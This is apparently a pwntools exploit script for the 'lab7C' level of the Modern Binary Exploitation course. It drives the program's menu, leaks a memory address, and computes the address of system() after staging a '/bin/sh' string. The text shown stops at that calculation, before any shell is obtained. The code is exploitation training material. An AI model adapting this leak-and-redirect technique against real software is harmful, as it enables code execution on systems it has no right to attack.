from pwn import *
import re

SYSTEM_OFF = 0xB7E63190 - 0x80000BC7

ADDR_REGEX = re.compile(r"[0-9]{7,}")
PATH = "/home/kamil/Projects/MBE/MBE_release/levels/lab07/lab7C"

p = process([PATH])
log.info(util.proc.pidof(p))

p.sendline("2")
p.sendline("65535")

p.sendline("4")

p.sendline("1")
p.sendline("/bin/sh")

p.sendline("6")
out = p.recv()
p.sendline("1")
leak = p.recv()

leaked_short_str = int(re.findall(ADDR_REGEX, leak)[0])
log.info("Leaked address: %s" % str(hex(leaked_short_str)))
system = leaked_short_str + SYSTEM_OFF
log.info("system() address: %s" % str(hex(system)))


